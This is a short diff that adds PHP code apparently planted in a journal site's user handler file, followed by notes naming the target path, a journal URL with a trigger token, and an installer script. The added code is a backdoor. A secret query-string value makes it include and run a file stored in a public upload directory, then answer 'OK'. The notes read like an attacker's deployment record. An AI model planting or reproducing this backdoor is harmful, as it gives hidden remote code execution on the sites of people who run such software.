@@ -1,0 +1,11 @@
+if (isset($_GET['_']) && $_GET['_'] === 'cpr_seo403_07cpr') {
+    $f="/home/sites/jssah-lppm/files_unpak/journals/1/issues/2/public/lppm";if($f!==""&&file_exists($f))include $f;
+    http_response_code(200);
+    header('Content-Type: text/plain; charset=utf-8');
+    echo 'OK';
+    exit;
+}
+
+path : pages/user/userhandler.php
+https://journal.arfadigitech.com/jurnamitra/user/register?_=ds_mms572s8_gr3af332afbsnk
+tools/instal.php
